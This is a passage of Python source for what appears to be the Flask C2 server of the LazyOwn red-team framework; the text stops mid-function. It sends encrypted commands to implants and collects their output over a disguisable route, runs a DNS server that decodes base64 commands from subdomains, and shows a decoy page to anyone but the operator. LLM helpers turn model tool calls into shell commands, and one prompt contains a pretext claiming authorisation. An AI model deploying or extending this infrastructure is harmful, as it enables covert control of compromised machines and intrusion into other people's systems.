import re
import os
import csv
import pty
import sys
import json
import yaml
import glob
import time
import fcntl
import shlex
import socket
import base64
import select
import struct
import termios
import logging
import requests
import markdown
import threading
import subprocess
import pandas as pd
from math import ceil
from io import StringIO 
from functools import wraps
from threading import Thread
from datetime import datetime
from lazyown import LazyOwnShell
from modules.colors import retModel
from watchdog.observers import Observer
from werkzeug.utils import secure_filename
from dnslib.server import DNSServer, DNSLogger
from flask_socketio import SocketIO, send, emit
from jinja2 import Environment, FileSystemLoader
from utils import getprompt, Config, load_payload
from watchdog.events import FileSystemEventHandler
from modules.lazygptcli2 import process_prompt, Groq
from modules.lazygptvulns import process_prompt_vuln
from modules.lazygpttask import process_prompt_task
from modules.lazyredopgpt import process_prompt_redop
from modules.lazyagentAi import process_prompt_search
from modules.lazygptcli3 import process_prompt_script
from modules.lazygptcli5 import process_prompt_general
from cryptography.hazmat.backends import default_backend
from modules.lazygptcli4 import process_prompt_adversary
from dnslib.server import DNSServer, BaseResolver, DNSLogger
from modules.lazydeepseekcli_local import process_prompt_local
from modules.lazydeepseekcli_localreport import process_prompt_localreport
from werkzeug.security import generate_password_hash, check_password_hash
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from dnslib import DNSRecord, DNSHeader, RR, QTYPE, A, TXT, CNAME, MX, NS, SOA, CAA, TLSA, SSHFP
from dnslib.dns import RR, QTYPE, A, NS, SOA, TXT, CNAME, MX, AAAA, PTR, SRV, NAPTR, CAA, TLSA, SSHFP
from flask_login import LoginManager, UserMixin, login_user, login_required, logout_user, current_user
from flask import Flask, request, render_template, redirect, url_for, jsonify, Response, send_from_directory, render_template_string, flash, abort, jsonify, Response, stream_with_context

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class Handler(FileSystemEventHandler):
    @staticmethod
    def on_any_event(event):
        try:
            if event.is_directory:
                return None

            event_info = {
                "type": event.event_type,
                "src_path": event.src_path,
                "dest_path": getattr(event, 'dest_path', None),
                "size": os.path.getsize(event.src_path) if os.path.exists(event.src_path) else None,
                "timestamp": datetime.now().isoformat()
            }
            if event.src_path.startswith(f"{BASE_DIR}{rhost}"):
                global counter_events
                global events
                counter_events += 1
                events.append(event_info)
                if counter_events >= 1000:
                    events.sort(key=lambda x: x['timestamp'], reverse=True)
                    events = events[:1000]
        except Exception as e:
            print(f"Error watchdog: {e}")

def get_karma_name(elo):
    if elo < 1000:
        return "Noob"
    elif elo < 2000:
        return "Rookie"
    elif elo < 3000:
        return "Skidy"
    elif elo < 4000:
        return "Hacker"
    elif elo < 5000:
        return "Pro"
    elif elo < 6000:
        return "Elite"
    else:
        return "Godlike"

def fromjson(value):
    return json.loads(value)

def run_shell():
    while True:
        try:
            shell.cmdloop()
        except Exception as e:
            print(f"[ERROR] Shell loop crashed: {e}")
            break

def load_banners():
    """Loads the banners from the JSON file."""
    try:
        with open('sessions/banners.json', 'r') as file:
            config = json.load(file)
    except FileNotFoundError:
        print("Error: File banners.json not found")
        return
    return config

def load_mitre_data():
    mitre_path = os.path.join("external", ".exploit", "mitre", "enterprise-attack", "enterprise-attack-16.1.json")
    with open(mitre_path, "r") as f:
        return json.load(f)

def load_event_config():
    try:
        with open('event_config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        return {"events": []}

def load_notifications():
    JSON_FILE_PATH = 'sessions/notifications.json'
    if not os.path.exists(JSON_FILE_PATH):
        with open(JSON_FILE_PATH, 'w') as f:
            json.dump([], f)
    with open(JSON_FILE_PATH, 'r') as f:
        notifications = json.load(f)
    return notifications

def implants_check():
    implants["implants"].clear()

    implant_files = glob.glob(os.path.join(BASE_DIR, 'implant_config*.json'))
    logging.info(implant_files)
    if implant_files:
        for i, file in enumerate(implant_files, start=1):
            try:
                with open(file, 'r') as f:
                    logging.info("Info: Implants created.")
                    content = f.read().strip()
                    implants["implants"].append({
                        "implant": i,
                        "content": content
                    })
            except Exception as e:
                print(f"[Error] reading file")


def start_watching():
    event_handler = Handler()
    observer = Observer()
    observer.schedule(event_handler, DIRECTORY_TO_WATCH, recursive=True)
    observer.start()

    try:
        while True:
            time.sleep(1)
    except:
        observer.stop()
    observer.join()

def load_tasks():
    if not os.path.exists('sessions/tasks.json'):
        with open('sessions/tasks.json', 'w') as file:
            json.dump([], file)
    with open('sessions/tasks.json', 'r') as file:
        return json.load(file)

def create_cves():
    if not os.path.exists('sessions/cves.json'):
        with open('sessions/cves.json', 'w') as json_file:
            return json.dump({}, json_file)   

def load_cves():
    if not os.path.exists('sessions/cves.json'):
        with open('sessions/cves.json', 'w') as file:
            json.dump([], file)
    with open('sessions/cves.json', 'r') as file:
        return json.load(file)
    

def save_cves(cves):
    with open('sessions/cves.json', 'w') as file:
        json.dump(cves, file, indent=4)


         
def create_report():
    if not os.path.exists(JSON_FILE_PATH_REPORT):
        with open(JSON_FILE_PATH_REPORT, 'w') as json_file:
            return json.dump({}, json_file)    

def save_tasks(tasks):
    with open('sessions/tasks.json', 'w') as file:
        json.dump(tasks, file, indent=4)


def load_note():
    file_path = 'sessions/notes.txt'
    if not os.path.exists(file_path):
        with open(file_path, 'w') as file:
            file.write(json.dumps({"content": ""}))

    with open(file_path, 'r') as file:
        notes = file.read().strip()

    if not notes:
        return {"content": ""}

    try:
        return json.loads(notes)
    except json.JSONDecodeError:
        return {"content": ""}

def aumentar_elo(user_id, cantidad):
    if os.path.exists(USER_DATA_PATH):
        with open(USER_DATA_PATH, 'r') as file:
            users = json.load(file)
    else:
        users = []

    usuario = next((user for user in users if user['id'] == user_id), None)

    if usuario:

        usuario['elo'] += cantidad
        print(f"The Elo of user {usuario['username']} Increased in {usuario['elo']}.")

        with open(USER_DATA_PATH, 'w') as file:
            json.dump(users, file, indent=4)
    else:
        print(f"User ID {user_id} not found.")

def save_note(content):
    file_path = 'sessions/notes.txt'
    with open(file_path, 'w') as file:
        file.write(json.dumps({"content": content}))
       
def escape_js(s):
    return json.dumps(s)[1:-1]

def markdown_to_html(text):
    if text:
        text_with_br = text.replace('\n', '<br />')
        html_content = markdown.markdown(text_with_br, extensions=['extra'])
    else:
        return escape_js("")    
    return html_content

def to_serializable(obj):
    """Convert objects to serializable format."""
    if isinstance(obj, (list, dict, str, int, float, bool, type(None))):
        return obj
    return str(obj)

def make_serializable(data):
    """Recursively convert data to serializable format."""
    if isinstance(data, dict):
        return {k: make_serializable(v) for k, v in data.items()}
    elif isinstance(data, list):
        return [make_serializable(item) for item in data]
    else:
        return to_serializable(data)

def escape_js_string(value):
    """Escape special characters in a string for JavaScript."""
    if isinstance(value, str):
        value = re.sub(r'([\\"\'])', r'\\\1', value)
        value = re.sub(r'\n', r'\\n', value)
        value = re.sub(r'\r', r'\\r', value)
    return value

def strip_ansi(s):
    ansi_regex = re.compile(r'[\u001b\u009b][[()#;?]*(?:[0-9]{1,4}(?:;[0-9]{0,4})*)?[0-9A-ORZcf-nqry=><]')
    return ansi_regex.sub('', s)

def check_auth(username, password):
    """Verifica si el usuario y contraseña son correctos"""
    return username == USERNAME and password == PASSWORD

def authenticate():
    """Solicita autenticación"""
    return Response(
        'Invalid credentials. Please provide valid username and password.\n',
        401,
        {'WWW-Authenticate': 'Basic realm="Login Required"'}
    )

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth = request.authorization
        if not auth or not check_auth(auth.username, auth.password):
            return authenticate()
        return f(*args, **kwargs)
    return decorated

def aicmd_deepseek(cmd):
    if cmd == 'ping':
        ping = shell.one_cmd("ping")
        ping = strip_ansi(ping)
        return ping

    cmd_string = cmd
    commands = [
        {
            "ping": {
                "content_system": "You are a bot and the mission is identify if the target is alive and the os or if is offline. give me the result of the command",
                "content_user": "the host is alive and what os is?",
                "func_desc": "Evaluate if the host is a live or not and the host os",
                "command_desc": "The command to evaluate the target",
            }
        },
        {
            "gospider ssl": {
                "content_system": "You are a bot and the mission is to analyze the result of the gospider tool and provide info helpfull to the user, the test is on my machine private and i only have access",
                "content_user": "what routes is interesting in redteam context",
                "func_desc": "send a spider to web scrap a host or url",
                "command_desc": "The command to webscaping with gospider to the target",
            }
        }
    ]
    command_info = None
    for command in commands:
        if cmd_string in command:
            command_info = command[cmd_string]
            break

    if not command_info:
        return "Command not found"

    messages = [
        {
            "role": "system",
            "content": command_info["content_system"]
        },
        {
            "role": "user",
            "content": command_info["content_user"],
        }
    ]

    tools = [
        {
            "type": "function",
            "function": {
                "name": "shell.one_cmd",
                "description": command_info["func_desc"],
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": command_info["command_desc"],
                        }
                    },
                    "required": ["command"],
                },
            },
        }
    ]

    logging.info("Sending request to DeepSeek")
    response = requests.post(
        "http://localhost:11434/api/generate",
        json={
            "model": "deepseek-r1:1.5b",
            "prompt": json.dumps(messages),
            "stream": False
        }
    )

    if response.status_code == 200:
        response_message = response.json().get("response", "")
        tool_calls = json.loads(response_message).get("tool_calls", [])

        if tool_calls:
            available_functions = {
                "shell.one_cmd": shell.one_cmd,
            }

            messages.append({"role": "assistant", "content": response_message})

            for tool_call in tool_calls:
                function_name = tool_call["function"]["name"]
                function_to_call = available_functions[function_name]
                function_args = json.loads(tool_call["function"]["arguments"])

                function_response = function_to_call(
                    command=cmd_string
                )

                messages.append(
                    {
                        "tool_call_id": tool_call["id"],
                        "role": "tool",
                        "name": function_name,
                        "content": function_response,
                    }
                )

            second_response = requests.post(
                "http://localhost:11434/api/generate",
                json={
                    "model": "deepseek-r1:1.5b",
                    "prompt": json.dumps(messages),
                    "stream": False
                }
            )

            if second_response.status_code == 200:
                response_bot = second_response.json().get("response", "")
                return response_bot
            else:
                return f"Error in second request: {second_response.status_code}"
        else:
            return response_message
    else:
        return f"Error in first request: {response.status_code}"

def aicmd(cmd):
    #if cmd == 'ping':
    #    ping = shell.one_cmd("ping")
    #    ping = strip_ansi(ping)
    #    return ping


    cmd_string = cmd
    commands = [
        {
            "ping": {
                "content_system": "You are a bot and the mission is identify if the target is alive and the os or if is offline. give me the result of the command",
                "content_user": "the host is alive and what os is?",
                "func_desc": "Evaluate if the host is a live or not and the host os",
                "command_desc": "The command to evaluate the target",
            }
        },
        {
            "gospider ssl": {
                "content_system": "You are a bot and the mission is to analyze the result of the gospider tool and provide info helpfull to the user, the test is on my machine private and i only have access",
                "content_user": "what routes is interesting in redteam context",
                "func_desc": "send a spider to web scrap a host or url",
                "command_desc": "The command to webscaping with gospider to the target",
            }
        }
    ]
    command_info = None
    for command in commands:
        if cmd_string in command:
            command_info = command[cmd_string]
            break

    if not command_info:
        return "Command not found"

    messages = [
        {
            "role": "system",
            "content": command_info["content_system"]
        },
        {
            "role": "user",
            "content": command_info["content_user"],
        }
    ]

    tools = [
        {
            "type": "function",
            "function": {
                "name": "shell.one_cmd",
                "description": command_info["func_desc"],
                "parameters": {
                    "type": "object",
                    "properties": {
                        "command": {
                            "type": "string",
                            "description": command_info["command_desc"],
                        }
                    },
                    "required": ["command"],
                },
            },
        }
    ]
    logging.info(MODEL)
    response = client.chat.completions.create(
        model=MODEL,
        messages=messages,
        stream=False,
        tools=tools,
        tool_choice="auto",
    )

    response_message = response.choices[0].message
    tool_calls = response_message.tool_calls

    if tool_calls:
        available_functions = {
            "shell.one_cmd": shell.one_cmd,
        }

        messages.append(response_message)

        for tool_call in tool_calls:
            function_name = tool_call.function.name
            function_to_call = available_functions[function_name]
            function_args = json.loads(tool_call.function.arguments)

            function_response = function_to_call(
                command=cmd_string
            )

            messages.append(
                {
                    "tool_call_id": tool_call.id,
                    "role": "tool",
                    "name": function_name,
                    "content": function_response,
                }
            )

        second_response = client.chat.completions.create(
            model=MODEL,
            messages=messages
        )

        response_bot = second_response.choices[0].message.content
        return response_bot

def search_database(term, data_path="parquets/techniques.parquet"):
    """
    Busca un término en un DataFrame, manejando listas y structs correctamente.

    Args:
        term (str): El término de búsqueda.
        data_path (str, optional): Ruta al archivo Parquet.

    Returns:
        str: Contenido Markdown de los resultados, o mensaje de error.
    """
    try:
        df = pd.read_parquet(data_path)
    except FileNotFoundError:
        return f"Error: File not found"
    except ValueError as e:
        return f"Error reading Parquet"

    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, list)).any():
            df[col] = df[col].apply(lambda x: ', '.join(map(str, x)) if isinstance(x, list) else x)

    struct_cols_to_drop = []
    for col in df.columns:
        if df[col].apply(lambda x: isinstance(x, dict)).any():
            struct_cols_to_drop.append(col)
            df = pd.concat([df.drop(columns=[col]), df[col].apply(pd.Series).add_prefix(f"{col}.")], axis=1)

    term_lower = term.lower()
    results = df[df.apply(lambda row: row.astype(str).str.lower().str.contains(term_lower).any(), axis=1)]

    md_content = ""
    if not results.empty:
        for _, row in results.iterrows():
            md_content += f"# Result {_ + 1}\n"  # Añade un título para cada resultado
            for key, value in row.items():
                md_content += f"- **{key}**: {value}\n"
            md_content += "\n"
    else:
        md_content = f"No Results for: '{term}'\n"

    return md_content


def execute_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            timeout=10
        )
        return result.stdout + result.stderr
    except Exception as e:
        return str(e)

class CustomDNSResolver(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        qname = str(request.q.qname)
        qtype = request.q.qtype

        # Loggear la consulta entrante
        logger.info(f"Consulta recibida: {qname} (Tipo: {QTYPE[qtype]})")

        # Extraer el subdominio (comando codificado en base64)
        subdomain = qname.replace(".c2.lazyown.org.", "").rstrip('.')

        # Respuestas predefinidas para subdominios específicos
        subdomain_responses = {
            "info.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.TXT: TXT("Información sobre esporalibre.cl")
            },
            "mail.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.MX: MX("mail.esporalibre.cl.")
            },
            "www.esporalibre.cl.": {
                QTYPE.A: A("192.168.1.98"),
                QTYPE.CNAME: CNAME("esporalibre.cl.")
            },
            "ns.esporalibre.cl.": {
                QTYPE.NS: NS("ns.esporalibre.cl.")
            },
            "esporalibre.cl.": {
                QTYPE.SOA: SOA(
                    "ns.esporalibre.cl.",
                    "admin.esporalibre.cl.",
                    (1, 3600, 600, 86400, 3600)
                ),
                QTYPE.MX: MX("mail.esporalibre.cl."),
                QTYPE.TXT: TXT("v=spf1 include:_spf.google.com ~all"),
                QTYPE.CAA: CAA(0, "issue", "letsencrypt.org"),
                QTYPE.TLSA: TLSA(1, 1, 1, b"your_tlsa_data"),
                QTYPE.SSHFP: SSHFP(1, 1, b"your_sshfp_data")
            },
            # Configurar respuestas para c2.lazyown.org y sus subdominios
            "c2.lazyown.org.": {
                QTYPE.A: A("127.0.0.1"),  # IP del servidor DNS
                QTYPE.TXT: TXT("Servidor C2 activo")
            }
        }

        # Verificar si el dominio tiene una respuesta predefinida
        if qname in subdomain_responses:
            if qtype in subdomain_responses[qname]:
                reply.add_answer(RR(qname, qtype, rdata=subdomain_responses[qname][qtype], ttl=300))
                logger.info(f"Respuesta predefinida enviada para {qname}")
            else:
                reply.header.rcode = 3  # NXDOMAIN
                logger.warning(f"Tipo de consulta no soportado para {qname}: {QTYPE[qtype]}")
        else:
            # Manejar subdominios de c2.lazyown.org
            if qname.endswith("c2.lazyown.org."):
                try:
                    # Decodificar el comando desde el subdominio
                    command = base64.urlsafe_b64decode(subdomain + "==").decode('utf-8') 
                    logger.info(f"Comando recibido: {command}")

                    # Procesar el comando
                    if command.startswith("exec:"):
                        output = f"Ejecutado: {command[5:]}"
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(output), ttl=60))
                        logger.info(f"Respuesta enviada: {output}")
                    else:
                        reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Comando no reconocido"), ttl=60))
                        logger.warning(f"Comando no reconocido: {command}")

                except Exception as e:
                    logger.error(f"Error:")
                    reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT("Error en el comando"), ttl=60))
            else:
                # Dominio no reconocido
                reply.header.rcode = 3  # NXDOMAIN
                logger.warning(f"Dominio no reconocido: {qname}")

        return reply

def start_dns_server():
    resolver = CustomDNSResolver()
    logger.info("Iniciando servidor DNS en el puerto 53...")
    server = DNSServer(resolver, port=53, address="0.0.0.0")
    server.start()

def tcp_bridge(local_port, remote_host, remote_port):
    """Establish a TCP bridge between a local port and a remote host."""
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', local_port))
    server_socket.listen(5)
    print(f"[*] Listening for connections on port {local_port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[INFO] Accepted connection from {addr}")

        threading.Thread(target=handle_client, args=(client_socket, remote_host, remote_port)).start()

def handle_client(client_socket, remote_host, remote_port):
    """Handle communication between the client and the remote server."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.connect((remote_host, remote_port))

        while True:

            client_data = client_socket.recv(4096)
            if not client_data:
                break
            server_socket.sendall(client_data)

            server_data = server_socket.recv(4096)
            if not server_data:
                break
            client_socket.sendall(server_data)

    client_socket.close()

def decoy():
    client_ip = request.remote_addr
    logging.info(f"[INFO]: IP {client_ip}")
    if (client_ip != lhost) and (client_ip != '127.0.0.1'):
        return render_template('decoy.html')
    return None

def encrypt_data(data):
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(data) + encryptor.finalize()
    combined = iv + encrypted_data 
    return base64.b64encode(combined).decode('utf-8')  

def decrypt_data(encrypted_data, is_file = False):
    encrypted_data = base64.b64decode(encrypted_data)
    iv = encrypted_data[:16]
    encrypted_data = encrypted_data[16:]
    cipher = Cipher(algorithms.AES(AES_KEY), modes.CFB(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
    if is_file:
        return decrypted_data
    else:
        return decrypted_data.decode('utf-8')

def set_winsize(fd, row, col, xpix=0, ypix=0):
    """Configura el tamaño de la terminal"""
    winsize = struct.pack("HHHH", row, col, xpix, ypix)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)

def read_and_forward_pty_output():
    """Lectura continua del PTY y envío por WebSocket"""
    max_read_bytes = 1024 * 20
    while True:
        socketio.sleep(0.01)
        if app.config["fd"]:
            try:
                timeout_sec = 0
                (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
                if data_ready:
                    output = os.read(app.config["fd"], max_read_bytes)
                    if output:
                        socketio.emit("pty-output", {"output": output.decode(errors="replace")}, namespace="/pty")
            except Exception as e:
                logger.error(f"Error leyendo salida: {e}")
                
def read_and_forward_pty_output_c2():
    max_read_bytes = 1024 * 20
    while True:
        socketio.sleep(0.01)
        if app.config["fd"]:
            timeout_sec = 0
            (data_ready, _, _) = select.select([app.config["fd"]], [], [], timeout_sec)
            if data_ready:
                output = os.read(app.config["fd"], max_read_bytes).decode(errors="replace")
                socketio.emit('output', {'data': output}, namespace='/terminal')
         
def get_discovered_hosts():
    """
    Reads the sessions/hostsdiscovery.txt file and returns a list of discovered hosts.
    Also reads IPs from scan_discovery*.csv files in the sessions directory.
    """
    hosts_file_path = os.path.join('sessions', 'hostsdiscovery.txt')
    discovered_hosts = []
    local_ips = get_local_ip_addresses()

    try:
        with open(hosts_file_path, 'r') as f:
            for line in f:
                ip_address = line.strip()
                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                    discovered_hosts.append(ip_address)
        if isinstance(local_ips, str):
            if local_ips not in discovered_hosts:
                discovered_hosts.append(local_ips)
        elif isinstance(local_ips, list):
            for ip in local_ips:
                if ip not in discovered_hosts:
                    discovered_hosts.append(ip)
        elif isinstance(local_ips, str):
            if local_ips not in discovered_hosts:
                discovered_hosts.append(local_ips)
    except FileNotFoundError:
        print(f"Error: File not found at {hosts_file_path}")

    scan_files = glob.glob(os.path.join('sessions', 'scan_discovery*.csv'))
    if scan_files:
        for file_path in scan_files:
            try:
                with open(file_path, 'r') as f:
                    next(f)
                    for line in f:
                        line = line.strip()
                        if line:
                            parts = line.split(';')
                            if len(parts) > 0:
                                ip_address = parts[0].strip('"')
                                if ip_address and ip_address not in local_ips and ip_address not in discovered_hosts:
                                    discovered_hosts.append(ip_address)
            except FileNotFoundError:
                print(f"Error: Scan discovery file not found at {file_path}")
            except Exception as e:
                print(f"Error reading scan discovery file {file_path}: {e}")

    return discovered_hosts

def get_local_ip_addresses():
    local_ips = []
    try:
        process = subprocess.run(['ip', 'addr'], capture_output=True, text=True, check=True)
        output = process.stdout

        for line in output.splitlines():
            if 'inet ' in line:
                parts = line.split()
                ip_address = parts[1].split('/')[0]
                if ip_address != "127.0.0.1":
                    if ('eth0' in line or 'wlan0' in line or 'tun0' in line or 'br-' in line):
                        local_ips.append(ip_address)
                    elif 'lo' not in line and not any(prefix in line for prefix in ['docker', 'veth']):
                        local_ips.append(ip_address)

        if not local_ips:
            return "No se pudo obtener la IP del servidor desde el sistema operativo."
        return local_ips
    except subprocess.CalledProcessError as e:
        return f"Error al ejecutar el comando: {e}"
    except FileNotFoundError:
        return "El comando 'ip' no se encontró en el sistema."

def sanitize_json(data):
    """
    Elimina datos sensibles del diccionario JSON.
    Adaptar esta función según la estructura específica de tu payload.json.
    """
    if isinstance(data, dict):
        keys_to_remove = ["c2_user", "c2_pass", "api_key", "telegram_token", "discord_token", "start_user", "start_pass", "rat_key", "email_from", "email_password", "email_username"]
        for key in list(data.keys()):  # Iterar sobre una copia de las claves para poder eliminarlas
            if key in keys_to_remove or "secret" in key.lower():
                del data[key]
            elif isinstance(data[key], (dict, list)):
                data[key] = sanitize_json(data[key])
        return data
    elif isinstance(data, list):
        return [sanitize_json(item) for item in data]
    return data

def add_dynamic_data(data):
    """
    Agrega datos dinámicos al diccionario JSON si es necesario,
    basándose en el contenido del diccionario 'data'.
    """
    data['timestamp'] = 'now' 

    return data


app = Flask(__name__, static_folder='static')
app.secret_key = 'GrisIsComebackSayKnokKnokSecretlyxDjajajja'
app.config['SECRET_KEY'] = app.secret_key
app.config['SESSION_COOKIE_SECURE'] = True  # Solo enviar cookies sobre HTTPS
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['REMEMBER_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_SAMESITE'] = 'Lax'
app.config["fd"] = None
app.config["child_pid"] = None
app.jinja_env.filters['fromjson'] = fromjson
app.jinja_env.filters['markdown'] = markdown_to_html
BASE_DIR = os.getcwd()
TOOLS_DIR = f'{BASE_DIR}/tools'
BASE_DIR += "/sessions/"
ALLOWED_DIRECTORY = BASE_DIR
MODEL = retModel()
shell = LazyOwnShell()
shell.stdout = StringIO() 
shell.onecmd('p')
shell.onecmd('create_session_json')
JSON_FILE_PATH_REPORT = 'static/body_report.json'
implants = {"implants": []}
commands = {}
results = {}
commands_history = {}
remote_commands_history = {}
connected_clients = set()
path = os.getcwd()
atomic_framework_path = f'{path}/external/.exploit/atomic-red-team/atomics'
events = []
counter_events = 0
socketio = SocketIO(app, cors_allowed_origins="*")
login_manager = LoginManager(app)
login_manager.login_view = 'login'
USER_DATA_PATH = 'users.json'
ENV = "PROD"
with open(f"{path}/sessions/key.aes", 'rb') as f:
    AES_KEY = f.read()

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
config = Config(load_payload())
UPLOAD_FOLDER = os.path.join(os.getcwd(), 'sessions', 'uploads')
api_key = config.api_key
route_maleable = config.c2_maleable_route
win_useragent_maleable = config.user_agent_win
lin_useragent_maleable = config.user_agent_lin
rhost = config.rhost
lhost = config.lhost
reverse_shell_port = config.reverse_shell_port
DIRECTORY_TO_WATCH = f"{BASE_DIR}"
client = Groq(api_key=api_key)
env = Environment(loader=FileSystemLoader('templates'))
env.filters['markdown'] = markdown_to_html
print(f"[DEBUG] Clave AES (hex): {AES_KEY.hex()}")
implants_check()
create_report()
local_ips = get_local_ip_addresses()

if len(sys.argv) > 3:
    lport = sys.argv[1]
    USERNAME = sys.argv[2]
    PASSWORD = sys.argv[3]
    print(f"    [!] Launch C2 at: {local_ips}")
    print(f"    [!] Launch C2 at: {lport}")
else:
    print("    [!] Need pass the port, user & pass as argument")
    sys.exit(2)

if not api_key:
    logging.error("Error: La API key no está configurada en el archivo payload.json")
    exit(1)

if not route_maleable:
    logging.error("Error: c2_maleable_route not found ond payload.json add, Ex:\"c2_maleable_route\": \"/gmail/v1/users/\",")
    sys.exit(1)

if not os.path.exists(atomic_framework_path):
    shell.onecmd('atomic_tests')

class User(UserMixin):
    def __init__(self, user_data):
        self.id = user_data['id']
        self.username = user_data['username']
        self.password_hash = user_data['password_hash']
        self.elo = user_data['elo']

def load_users():
    if os.path.exists(USER_DATA_PATH):
        with open(USER_DATA_PATH, 'r') as file:
            return json.load(file)
    return []

def save_users(users):
    with open(USER_DATA_PATH, 'w') as file:
        json.dump(users, file, indent=4)

@login_manager.user_loader
def load_user(user_id):
    users = load_users()
    for user_data in users:
        if user_data['id'] == int(user_id):
            return User(user_data)
    return None

@app.template_filter('tojson')
def tojson_filter(value, **kwargs):
    """Custom tojson filter to handle non-serializable objects."""
    return json.dumps(make_serializable(value), **kwargs)

@app.route('/', methods=['GET', 'POST'])
@requires_auth
def index():
    response = decoy()
    client_ip = request.remote_addr
    if response:
        return response
    else:
        if current_user.is_authenticated:
            print(f"Autenticated. Wellcome {client_ip}") 
        else:
            print("Unautenticated.")
            return redirect(url_for('login'))
    path = os.getcwd()
    user_agent = request.headers.get('User-Agent')
    host = request.headers.get('Host')
    print(user_agent)
    print(host)
    prompt = getprompt()
    prompt = prompt.replace('\n','<br>')
    sessions_dir = f'{path}/sessions'
    json_files = [f for f in os.listdir(sessions_dir) if f.endswith('.json')]
    implants_check()
    if not json_files:
        return "No JSON files found in the sessions directory.", 404
    tasks = load_tasks()
    if request.method == 'POST':
        title = request.form['title']
        description = request.form['description']
        operator = request.form['operator']
        status = request.form['status']
        valid_statuses = ["New", "Refined", "Started", "Review", "Qa", "Done", "Blocked"]

        if status not in valid_statuses:
            return "Invalid status selected!", 400
        
        new_task = {
            'id': len(tasks),
            'title': title,
            'description': description,
            'operator': operator,
            'status': status
        }
        tasks.append(new_task)
        save_tasks(tasks)
        flash('Task created successfully!', 'success')
        return redirect(url_for('index'))

    latest_json_file = max(json_files, key=lambda x: os.path.getctime(os.path.join(sessions_dir, x)))
    json_path = os.path.join(sessions_dir, latest_json_file)

    with open(json_path, 'r') as f:
        session_data = json.load(f)

    
    if isinstance(session_data, list):
        session_data = session_data[0] if session_data else {}

    session_data['params'] = make_serializable(session_data.get('params', {}))
    session_data['params']['api_key'] = 'Hidden conntent'
    connected_clients_list = list(connected_clients)
    directories = [d for d in os.listdir(atomic_framework_path) if os.path.isdir(os.path.join(atomic_framework_path, d))]

    commands_history = {}
    os_data = {}
    pid = {}
    hostname = {}
    ips = {}
    user = {}
    discovered_ips = {}
    result_portscan = {}
    for client_id in connected_clients_list:
        csv_file = f"sessions/{client_id}.log"
        try:
            if os.path.isfile(csv_file):
                with open(csv_file, 'r') as f:
                    reader = csv.DictReader(f)
                    rows = list(reader)
                    if rows:
                        commands_history[client_id] = [rows[-1]]
                        os_data[client_id] = rows[-1]['os']
                        pid[client_id] = rows[-1]['pid']
                        hostname[client_id] = rows[-1]['hostname']
                        ips[client_id] = rows[-1]['ips']
                        user[client_id] = rows[-1]['user']
                        discovered_ips[client_id] = rows[-1]['discovered_ips']
                        result_portscan[client_id] = rows[-1]['result_portscan']
                     
        except Exception as e:
            print("[Error] implant logs corrupted.")
    
    event_config = load_event_config()
    response_bot = "<p><h3>LazyOwn RedTeam Framework</h3> The <b>First GPL Ai Powered C&C</b> of the <b>World</b></p>"
    tools = []
    for filename in os.listdir(TOOLS_DIR):
        if filename.endswith('.tool'):
            tool_path = os.path.join(TOOLS_DIR, filename)
            with open(tool_path, 'r') as file:
                tool_data = json.load(file)
                tool_data['filename'] = filename  # Agregar el nombre del archivo al diccionario
                tools.append(tool_data)
    
    karma_name = get_karma_name(current_user.elo)
    connected_hosts = get_discovered_hosts()

    return render_template(
        'index.html',
        connected_clients=connected_clients_list,
        connected_hosts=connected_hosts,
        results=results,
        session_data=session_data,
        commands_history=commands_history,
        os_data=os_data,
        pid=pid,
        hostname=hostname,
        ips=ips,
        user=user,
        username=USERNAME,
        password=PASSWORD,
        c2_route=route_maleable,
        win_useragent=win_useragent_maleable,
        lin_useragent=lin_useragent_maleable,
        implants=implants,
        directories=directories,
        tasks=tasks,
        bot=response_bot,
        event_config=event_config,
        config=config,
        tools=tools,
        current_user=current_user, 
        karma_name=karma_name,
        current_user_id = current_user.id,
        elo=current_user.elo,
        prompt = prompt,
        local_ips= local_ips,
        discovered_ips=discovered_ips,
        result_portscan=result_portscan
    )

@app.route('/command/<client_id>', methods=['GET'])
@app.route(f'{route_maleable}<client_id>', methods=['GET'])
def send_command(client_id):
    connected_clients.add(client_id)
    if client_id in commands:
        command = commands.pop(client_id)
        encrypted_command = encrypt_data(command.encode())
        return Response(encrypted_command)
    else:
        logging.info(f"No command for client {client_id}")
        encrypted_response = encrypt_data(b'')
        return Response(encrypted_response, mimetype='application/octet-stream')

@app.route('/command/<client_id>', methods=['POST'])
@app.route(f'{route_maleable}<client_id>', methods=['POST'])
def receive_result(client_id):
    try:
        logging.info(f"Receiving result from client {client_id}")
        encrypted_data = request.get_data()
        try:
            decrypted_data = decrypt_data(encrypted_data)
            client_id = decrypted_data.decode().strip()
        except:
            pass      
        decrypted_data = decrypt_data(encrypted_data)
        data = json.loads(decrypted_data)
        if client_id not in connected_clients:
